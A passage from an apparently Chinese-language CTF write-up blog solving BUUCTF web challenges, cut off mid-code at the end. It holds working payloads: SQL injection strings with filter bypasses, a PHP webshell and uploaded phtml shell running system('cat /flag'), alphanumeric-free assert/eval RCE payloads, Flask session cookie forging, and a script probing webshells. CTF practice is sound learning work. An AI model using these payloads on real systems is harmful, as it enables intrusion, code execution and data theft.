$password = <span class="string">'yesyes'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$obj = serialize($obj);</span><br><span class="line">$obj = str_replace(<span class="string">':2:'</span>, <span class="string">':3:'</span>, $obj);</span><br><span class="line"><span class="keyword">echo</span> urlencode($obj);</span><br></pre></td></tr></table></figure><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure></p><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>题目直接给出了shell<code>eval($_POST[&quot;Syc&quot;]);</code><br>然后直接读flag就行了<br><img src="/2020/04/02/buuctf/22.png" alt></p><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>题目毫无过滤，直接一把梭就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;4616398c-abd6-4030-87b8-27d8abd6fd4c.node3.buuoj.cn&#x2F;check.php?username&#x3D;adin%27union%20select%201,(select%20group_concat(password)%20from%20l0ve1ysq1),3%23&amp;password&#x3D;addmin</span><br></pre></td></tr></table></figure></p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>修改指定http头即可<br><img src="/2020/04/02/buuctf/23.png" alt></p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>过滤了or,and,from,union,select,where等字符，可以通过双写绕过，payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;39ae0ce7-baa4-43ed-9adf-df019b95a001.node3.buuoj.cn&#x2F;check.php?username&#x3D;0&#39; uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frfromom b4bsql),3-- +&amp;password&#x3D;456</span><br></pre></td></tr></table></figure></p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>题目Attention给出提示</p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p></blockquote><p>同时view-source存在源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    ~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><br>也就是说，得到flag需要达到三个条件</p><ol><li>是CUIT’s student</li><li>正确的密码</li><li>足够的money</li></ol><p>查看返回头可以看到存在cookie<code>user=0</code>，猜测可能是身份鉴别字段，修改值为1，这样就通过了CUIT的验证</p><blockquote><p>you are Cuiter<br>Please input your password!!</p></blockquote><p>password字段的验证绕过很简单，<code>is_numeric</code>存在截断漏洞，提交<code>password=404%00aaa</code>即可绕过</p><blockquote><p>you are Cuiter<br>Password Right!<br>Pay for the flag!!!hacker!!!</p></blockquote><p>然后提交金额100000000</p><blockquote><p>you are Cuiter<br>Password Right!<br>Nember lenth is too long</p></blockquote><p>数字过长可以使用科学计数法，提交<code>money=1e9</code>即可getflag</p><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>很简单的上传绕过，需要修改三个点</p><ol><li>content-type: image/jpeg</li><li>修改文件后缀名为phtml</li><li>添加图片前缀<code>GIF89a</code></li><li>使用标签<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code></li></ol><p><img src="/2020/04/02/buuctf/24.png" alt></p><p>上传成功后需要猜测上传目录，实际上传目录为<code>upload</code><br>getflag payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;2625763a-f599-4a0b-a1c7-1f9501ab20d2.node3.buuoj.cn&#x2F;upload&#x2F;shell.phtml?snow&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure></p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>报错注入，过滤了空格，可以使用括号包裹绕过，<code>=&lt;&gt;</code>也被过滤了，可以使用<code>in</code>语句来绕过<br>爆表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure></p><blockquote><p>H4rDsq1</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(select(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~id,username,password~‘</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~flag{7ba38da2-8bbb-4d78-9c9d-6a’</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~a2-8bbb-4d78-9c9d-6abe9bc51c29}’</p></blockquote><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>考察命令执行，题目给出了代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>参考P神的一篇博文<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字shell提高篇</a>中提到一种方法，在PHP7中，可以使用<code>($a)()</code>来执行代码，比如使用<code>(&#39;phpinfo&#39;)()</code>可以执行phpinfo函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7 -r <span class="string">"('phpinfo')();"</span></span><br></pre></td></tr></table></figure><br>运行该命令可以看到成功打印PHP信息，不过在版本小于PHP7时是不可以的<br>由于不允许出现数字字母，我们需要设法表示字母，可以使用<code>~</code>来实现，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7 -r &quot;echo urlencode(~&#39;phpinfo&#39;);&quot;  # 为了避免字符显示问题，所以进行了url编码</span><br></pre></td></tr></table></figure><br>然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php7 -r &quot;(~urldecode(&#39;%8F%97%8F%96%91%99%90&#39;))();&quot;;</span><br><span class="line"></span><br><span class="line">phpinfo()</span><br><span class="line">PHP Version &#x3D;&gt; 7.0.12</span><br><span class="line"></span><br><span class="line">System &#x3D;&gt; Windows NT DESKTOP-S4PD6MS 10.0 build 17763 (Windows 10) i586</span><br><span class="line">Build Date &#x3D;&gt; Oct 13 2016 10:44:50</span><br><span class="line">Compiler &#x3D;&gt; MSVC14 (Visual C++ 2015)</span><br><span class="line">Architecture &#x3D;&gt; x86</span><br></pre></td></tr></table></figure><br>可以看到是可以运行的，提交该payload，可以看到phpinfo()执行结果，查看disable_functions选项<br><img src="/2020/04/02/buuctf/25.png" alt><br>常用命令执行函数被ban了，可以使用<code>var_dump+scandir+file_get_contents</code>组合拳来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ php7 -r &quot;echo urlencode(~&#39;var_dump&#39;);&quot;</span><br><span class="line">%89%9E%8D%A0%9B%8A%92%8F</span><br><span class="line">➜ php7 -r &quot;echo urlencode(~&#39;scandir&#39;);&quot;</span><br><span class="line">%8C%9C%9E%91%9B%96%8D</span><br></pre></td></tr></table></figure><br>payload为<code>(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27/%27));</code>，相当于执行了<code>var_dump(scandir(&#39;/&#39;));</code><br><img src="/2020/04/02/buuctf/26.png" alt><br>但是，接下来读取文件时却无法读取，应该是没有相应的权限，根目录下还有一个readflag文件，应该是要调用该程序读取flag<br>这样的话需要我们进行绕过disable_functions进行提权，我们先尝试获取一个webshell</p><p>查看disable_functions可以看到<code>assert</code>没有被ban，可以尝试利用之<br>官方文档中说，php7+版本中，assert不再作为函数而是作为一种语言结构，而且默认不能执行代码，不过，使用间接调用的方法却是可以当做函数执行的（不知道为啥），比如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(var_dump(<span class="string">'aaa'</span>));</span><br></pre></td></tr></table></figure><br>该语句执行时无任何返回，我们使用间接的方式来执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a(var_dump(<span class="string">'aaa'</span>));</span><br></pre></td></tr></table></figure></p><blockquote><p>string(3) “aaa”<br>PHP Warning:  assert(): Assertion failed in /var/www/html/rce.php on line 4</p></blockquote><p>此时成功执行</p><p>那么，我们就用此方法来getshell，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$&#123;~(%A0%B8%BA%AB)&#125;[_]($&#123;~(%A0%B8%BA%AB)&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[___]);</span><br></pre></td></tr></table></figure><br><img src="/2020/04/02/buuctf/27.png" alt><br>然后使用蚁剑连接，蚁剑中正好有绕过disable_funcs的插件，直接用一下<br><img src="/2020/04/02/buuctf/28.png" alt><br>提权之后读flag<br><img src="/2020/04/02/buuctf/28.png" alt></p><p>PS：根据出题大佬的原意，第一步的getshell是希望我们实现无文件getshell，并且给出了payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));</span><br><span class="line">&#x2F;&#x2F;(&quot;assert&quot;)((&quot;next&quot;)((&quot;getallheaders&quot;)()));</span><br></pre></td></tr></table></figure><br>然后通过UA头即可执行任意命令</p><hr><h1 id="PHP语言结构（language-construct）："><a href="#PHP语言结构（language-construct）：" class="headerlink" title="PHP语言结构（language construct）："></a>PHP语言结构（language construct）：</h1><p><strong>语言结构与函数相比的一些特征：</strong></p><ol><li>很多不需要括号，有的会需要</li><li>一些语言结构，能够实现一些函数不可能完成的事情，比如isset，经常会访问一下不存在的变量，如果使用函数来实现会非常难;</li><li>一些语言结构与函数写法存在差异。例如，Array(…)结构可以写成[…]</li><li>正如文档不断提醒我们的，<strong>语言结构不能作为可变函数引用</strong>。即<code>$a=&#39;print_r&#39;; $a(…);</code>是可以的，而<code>$a=&#39;print&#39;;$a(…);</code>则不行，因为print_r是函数，而print是语言结构</li></ol><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>python模板注入题目，查看hint.txt可知题目需要知道文件名与签名，flag.txt中已给出了flag位置<code>/fllllllllllllag</code>，签名格式为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>所以此题目标就是要获取<code>cookie_secret</code>值，当签名错误后会报错，此报错页面存在模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c031cfdc-f167-430e-858a-52ddf7406018.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure><p>简单测试</p><p><img src="/2020/04/02/buuctf/1.png" alt></p><p>通过hander对象来进行注入可以得到cookie</p><p><img src="/2020/04/02/buuctf/2.png" alt></p><p>然后计算签名获得flag</p><p><img src="/2020/04/02/buuctf/3.png" alt></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>本题是数字型注入，测试过滤</p><p><img src="/2020/04/02/buuctf/4.png" alt></p><p>发现题目可以进行堆叠注入，本来想利用<code>execute</code>来执行语句，但是过滤了prepare，根据探测发现目标表名为<code>Flag</code></p><p><img src="/2020/04/02/buuctf/5.png" alt></p><p>但是flag被过滤了，<code>from</code>字段也没法用，这里做到这儿就没思路了，查看资料发现解法是设置sql_mode，真的学到了</p><p>本题需要猜测后端的SQL语句，当输入0无数据返回，输入1会返回数据，所以后端可能是存在异或的</p><p><img src="/2020/04/02/buuctf/6.png" alt></p><p>后端sql语句可能是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select "</span>.$query.<span class="string">"||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>所以我们直接输入<code>*,1</code>也可以得到flag</p><p>除此之外，官方解法还可以通过设置sql_mode来解决，将<code>||</code>变为类似Oracle的管道连接符</p><p><img src="/2020/04/02/buuctf/7.png" alt></p><p>payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/02/buuctf/8.png" alt></p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>查看源代码发现提示信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure><p>需要我们以admin身份登录，浏览之后发现有注册功能，随便注册一个账号，登录之后看到存在cookie，应该是要伪造cookie，查看cookie格式应该是flask下的cookie，那么伪造的话我们需要获得secret_key，尝试了模板注入没有发现，最终在change页面发现源代码地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;</span><br></pre></td></tr></table></figure><p>查看源代码可以得知secret_key为<code>ckj123</code></p><p>然后就是正常的cookie伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py .\flask_session_cookie_manager3.py decode -c &#39;.eJxNkMGKwjAURX9lyNpFmupGcFGJU1J4L1QyE_I2MqNVm1iFVqmN-O9TXc32wD1w7oNt9m3VHdn82t6qCdvUOzZ_sI9fNmeYlz0ZFUGGQRvHtVwJyt0dPQiwVKOFAeUhYoRE23Xj7GpAQQGN4mi_j-iXwfml11IJZ4sa5WtbnJxQA8QiUL7i2mScbJmO3imZLCVTBJQZd2JdYwMJCDUDW5wo_xy5SsGXXOcYyGCjbdmjD_dxu2DPCdt27X5zvYTq_C9h1PqQogHuouqd30b0B06-nGq5q1-cJAiyX2OKmrkIUzos3rrzT1ONiu586dmE3bqqfZ_DEs6ef_NiYyk.XkThtA.0N3JaixDVMTckrVyXBvrmGo7sgI&#39; -s &#39;ckj123&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4d0e23092964816df16361fb5c24837359dfaa27fd5245ea60db0c826abb46162ecb232dda4904ed7df8e07e2d404cdb6c53b91bedad4272448cde3f9d0691df&#39;, &#39;csrf_token&#39;: b&#39;4f8f97534c20b73684f4887b534d36ee2429c38f&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;1&#39;&#125;&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure><p>可以得到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxNkMGKwjAURX9leGsXMdWN4EKJU1J4L1QyE_I24mjVJtaBqmgj_vtUV7M9cA-c-4DVrq3OB5hc2ms1gFW9hckDPn5gApSXN7Y6oYqdsV4YtZCc-zsFlOi4JocdqX2ihEPjlo13i44kR7JakPs-UJhHH-bBKC29K2pSr21x9FJ3mIrI-UIYOxPsyqz3jtjOMrZFJDUTXi5ranCIUo_RFUfOP3uuMwylMDlFttQYV94oxHu_ncJzAJtzu1tdfmN1-pfQa0PMyKLwSd982CQKe8GhHBm1rV-cFUp2X32KHvuEI95P37rTuql6xXrb1CcYwPVcte93YAjPP_KyYzs.XkTsFA.YOebiET5QoqNJ-EXRqMFRBrKHg8</span><br></pre></td></tr></table></figure><p><img src="/2020/04/02/buuctf/9.png" alt></p><hr><p>本题还有其它解法</p><p><strong>方法二：</strong></p><p>pass</p><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>题目直接给出了源码，下载之后是三千多个shell，但是大部分都不能用，需要找出能够使用的，方法是通过匹配<code>$_POST</code>或<code>$_GET</code>来执行命令，这里可以使用<code>echo</code>命令，因为该命令既在PHP下可以执行，在shell条件下也可以执行，此外，如果一个一个试的话速度会非常慢，我们需要使用多线程来增加速度，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.75.144/'</span></span><br><span class="line">flag = <span class="number">1</span>  <span class="comment"># 在得到可用shell之后退出线程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_shell</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        command = <span class="string">"echo 'aesm1p';"</span></span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">            cont = f.read()</span><br><span class="line">            <span class="comment"># POST</span></span><br><span class="line">            catches = re.findall(<span class="string">r"\$_POST\['(\S+)'\]"</span>, cont)</span><br><span class="line">            <span class="keyword">for</span> para <span class="keyword">in</span> catches:</span><br><span class="line">                data = &#123;para: command&#125;</span><br><span class="line">                res = requests.post(url+filename, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'aesm1p'</span> <span class="keyword">in</span> res:</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    print(<span class="string">'Success! url is &#123;&#125;. payload: &#123;&#125;'</span>.format(url + filename, para))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># GET</span></span><br><span class="line">            catches = re.findall(<span class="string">r"\$_GET\['(\S+)'\]"</span>, cont)</span><br><span class="line">            <span class="keyword">for</span> para <span class="keyword">in</span> catches:</span><br><span class="line">                res = requests.get(url + filename + <span class="string">'?'</span> + para + <span class="string">'='</span> + command).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'aesm1p'</span> <span class="keyword">in</span> res:</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    print(<span class="string">'Success! url is &#123;&#125;'</span>.format(url + filename + <span class="string">'?'</span> + para + <span class="string">'='</span> + command))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    files = os.listdir(<span class="string">'src/'</span>)</span><br><span class="line">    pool = mp.Pool(processes=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        pool.apply_async(test_shell,args = (<span class="string">'src/'</span> + file,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure><p><img src="/2020/04/02/buuctf/10.png" alt></p><p><img src="/2020/04/02/buuctf/11.png" alt></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>本题考点是php的字符串解析特性</p><p>PHP在将查询字符串（在URL中或者在正文中）转化为<code>$_GET</code>或<code>$_POST</code>数组时，会将一些字符删除或用下划线替代，它在解析时会做两件事</p><blockquote><ol><li>删除某些空白字符</li><li>将某些字符转换为下划线</li></ol></blockquote><p>例如下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_GET);</span><br><span class="line">var_dump($_POST);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/02/buuctf/12.png" alt></p><p>可以看到，在get参数中<code>[</code>被转换成了<code>_</code>，而字段名<code>前面的空格</code>被置空，但是字段名<code>后面的空格</code>会被保留</p><p>这个特性在绕过某些waf时可以用到，如某些waf对<code>user_id</code>字段有过滤，我们可以使用字段<code>user[id</code>来绕过，waf不会检测该字段，但是到了PHP后端则又会被转化为<code>user_id</code>，从而成功绕过WAF。</p><hr><p>本题中，查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I&#39;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></figure><p>给出了calc.php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span 